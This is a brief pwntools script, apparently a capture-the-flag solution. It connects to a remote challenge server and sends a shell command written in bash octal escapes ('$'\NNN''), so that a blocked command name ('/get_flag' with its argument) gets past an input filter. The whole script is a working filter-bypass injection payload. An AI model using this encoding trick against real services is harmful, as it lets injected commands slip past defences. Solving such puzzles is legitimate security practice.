from pwn import *

r = remote('35.189.118.225', 1337)

def to_octal(string):
    result = ''
    for c in string:
        result += '\\' + str(oct(ord(c)))[1:]
    return result

# payload = '$\'' + to_octal('/get_flag') + '\''
payload = '$\'' + to_octal('/get_flag') + '\' $\'' + to_octal('gimme_FLAG_please') + '\''
log.info('payload = ' + payload)
r.sendline(payload)
print r.recvline()
print r.recvline()
print r.recvline()
